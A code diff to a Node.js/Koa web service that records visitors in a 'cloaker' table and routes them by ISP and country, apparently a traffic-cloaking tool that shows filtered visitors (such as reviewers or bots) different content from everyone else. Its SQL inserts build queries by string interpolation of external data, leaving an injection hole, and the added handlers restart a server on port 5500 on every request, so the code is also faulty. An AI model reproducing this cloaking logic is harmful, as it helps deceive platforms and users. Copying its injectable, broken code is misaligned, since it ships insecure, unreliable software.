@@ -29,11 +29,8 @@ app2.use(koaProxy('/', {
   target: surl,
   changeOrigin: true,
   logs: true,
-  autoRewrite: true,
-  overrideResponseHeaders: {
-   "X-Frame-Options": "ALLOW-FROM https://app.blackflow.io"
-   },
-  suppressResponseHeaders: ['X-Frame-Options'] // case-insensitive
+  autoRewrite: true
+
 }))
 
 
@@ -81,14 +78,22 @@ console.log("IP: "+process.env.MYSQL_HOST)
 					    console.log(date+isp+geo)
 					    	if(blocked_isp.includes(JSON.parse(data).isp) == false){
 									const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
-									  
-									
-									res.status(200).redirect('http://localhost:5500/');res.end();
+									  app2.listen( 5500, () => {
+  console.log(`
+Visit http://localhost:5500`);
+});
+									console.log('1')
+									res.status(200).redirect('http://localhost:5500/');
+									res.end();
 					    	} else{
 					    		if(blocked_geo.includes(JSON.parse(data).country) == false){
 						    		const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
 									  
-									
+									console.log('2')
+									app2.listen( 5500, () => {
+  console.log(`
+Visit http://localhost:5500`);
+});
 									res.status(200).redirect('http://localhost:5500/');res.end();
 					    		}else{
 					    		request({uri: murl}, 
@@ -96,6 +101,7 @@ console.log("IP: "+process.env.MYSQL_HOST)
 								    const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
 									  
 									
+									console.log('3')
 									res.status(200).redirect(body);
 									res.end();
 								  });
@@ -108,9 +114,13 @@ console.log("IP: "+process.env.MYSQL_HOST)
 					    var geo = JSON.parse(data).country || "empty"
 					    console.log(date)
 					    		const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
-									  
+								app2.listen( 5500, () => {
+  console.log(`
+Visit http://localhost:5500`);
+});
 									
-									res.status(200).redirect('http://localhost:5500/');res.end();
+									console.log('4')
+									res.status(200).redirect('http://localhost:5500/');
 					    }
 				  })
 				}).on('error', function(e) {  console.log(e) ;});
@@ -118,12 +128,17 @@ console.log("IP: "+process.env.MYSQL_HOST)
 			}
 			else
 			{
-					const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
+request({uri: murl}, 
+								    async function(error, response, body) {
+								    const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
 									  
 									
-									res.status(200).redirect('http://localhost:5500/');res.end();
+									console.log('3')
+									res.status(200).redirect(body);
+									res.end();
+								  });
 					    		
-			}
+			} 
 	});
 });
 
@@ -194,12 +209,10 @@ app.post("/blackl", (req, res) => {
   res.send({ status: "Your domain's blacklist has been updated" });
 });
 
- const server = app2.listen(5500, () => {
-   console.log(`Koa is running on port 5500`)
- })
+
 
 // Listen on port 5000
 app.listen(process.env.PORT || 5000, () => {
-  console.log(`Server is booming on port 5000
+  console.log(`
 Visit http://localhost:5000`);
 });
